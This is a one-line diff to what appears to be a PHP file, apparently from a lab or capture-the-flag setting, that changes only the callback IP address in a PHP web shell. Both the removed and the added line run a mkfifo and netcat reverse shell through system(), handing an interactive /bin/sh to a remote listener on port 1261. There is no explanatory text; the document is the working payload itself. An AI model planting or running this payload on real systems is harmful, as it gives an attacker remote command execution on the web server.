@@ -1,1 +1,1 @@
-<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.239 1261 >/tmp/f"); ?>
+<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.174 1261 >/tmp/f"); ?>
